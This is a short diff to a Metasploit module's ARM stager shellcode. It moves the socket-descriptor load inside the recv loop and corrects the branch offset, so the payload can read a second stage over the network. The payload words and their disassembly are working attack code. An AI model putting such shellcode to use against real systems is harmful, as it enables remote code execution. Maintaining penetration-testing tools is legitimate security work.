@@ -77,9 +77,9 @@ module MetasploitModule
             0x0a000012,          #        beq     <failed>
             0xe2877063,          #        add     r7, r7, #99       ; set 291(0x123) to r7
             0xe1a01000,          #        mov     r1, r0
-            0xe1a0000c,          #        mov     r0, ip
             0xe3a03000,          #        mov     r3, #0
                                  #  loop:
+            0xe1a0000c,          #        mov     r0, ip
             0xe59d2000,          #        ldr     r2, [sp]
             0xe2422ffa,          #        sub     r2, r2, #1000
             0xe58d2000,          #        str     r2, [sp]
@@ -89,7 +89,7 @@ module MetasploitModule
             0xef000000,          #        svc     0x00000000        ; invoke recv
             0xe3500000,          #        cmp     r0, #0
             0xba000005,          #        blt     817c <failed>
-            0xeafffff5,          #        b       80dc <loop>
+            0xeafffff4,          #        b       80dc <loop>
                                  #  last:
             0xe2822ffa,          #        add     r2, r2, #1000
             0xef000000,          #        svc     0x00000000        ; invoke recv
